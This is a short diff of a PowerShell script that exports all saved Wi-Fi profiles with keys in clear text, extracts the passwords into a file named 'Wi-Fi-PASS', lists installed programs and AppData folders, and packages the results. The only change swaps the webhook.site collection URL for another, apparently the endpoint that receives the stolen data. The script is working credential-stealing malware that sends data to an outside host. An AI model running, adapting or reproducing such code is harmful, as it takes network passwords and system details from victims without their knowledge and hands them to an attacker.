@@ -2,7 +2,7 @@ $a = Get-ChildItem -Path "C:\Program Files\" | Where-Object { $_.PSIsContainer }
 $b = [System.IO.Path]::Combine($env:APPDATA)
 $c = Get-ChildItem -Path $b -Directory | Select-Object Name
 netsh wlan export profile key=clear
-$webhookUrl = "https://webhook.site/9b5b4ee6-f917-44c2-915b-d25f6f45fcb2"
+$webhookUrl = "https://webhook.site/5f09e085-afde-4b70-b363-fa665e0bf4f4"
 powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
 $data = @{
     "Main" = $a.Name
